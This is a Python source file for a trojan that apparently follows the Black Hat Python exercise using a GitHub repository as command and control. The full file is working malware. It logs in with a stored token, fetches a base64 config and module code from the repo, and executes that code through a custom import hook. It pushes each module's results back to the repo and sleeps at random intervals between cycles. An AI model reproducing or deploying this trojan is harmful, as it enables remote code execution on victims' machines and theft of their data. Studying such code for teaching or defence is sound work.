import base64
from importlib.abc import MetaPathFinder, Loader
from importlib.util import spec_from_loader

import github3
import json
import random
import sys
import threading
import time

from datetime import datetime


def github_connect():
    with open("mytoken.txt") as f:
        token = f.read()
    user = "LesPrimus"
    sess = github3.login(token=token)
    return sess.repository(user, 'BHP')


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content


class Trojan:
    def __init__(self,  idx):
        self.idx = idx
        self.config_file = f'{idx}.json'
        self.data_path = f'data/{idx}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents(
            'bhptrojan/config', self.config_file, self.repo
        )
        config = json.loads(base64.b64decode(config_json))
        for task in config:
            if (module := task['module']) not in sys.modules:
                exec(f"import {module}")
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'bhptrojan/data/{self.idx}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(
            remote_path, message, base64.b64encode(bindata)
        )

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                )
                thread.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30 * 60, 3 * 60 * 60))


class GitImportLoader(Loader):
    def __init__(self, data):
        self.data = data

    def exec_module(self, module):
        return exec(self.data, module.__dict__)


class GitImporter(MetaPathFinder):

    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        self.repo = github_connect()
        new_library = get_file_contents("bhptrojan/modules", f"{fullname}.py", self.repo)
        if new_library is not None:
            decoded_module = base64.b64decode(new_library)
            return spec_from_loader(fullname, GitImportLoader(decoded_module))
        return None


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
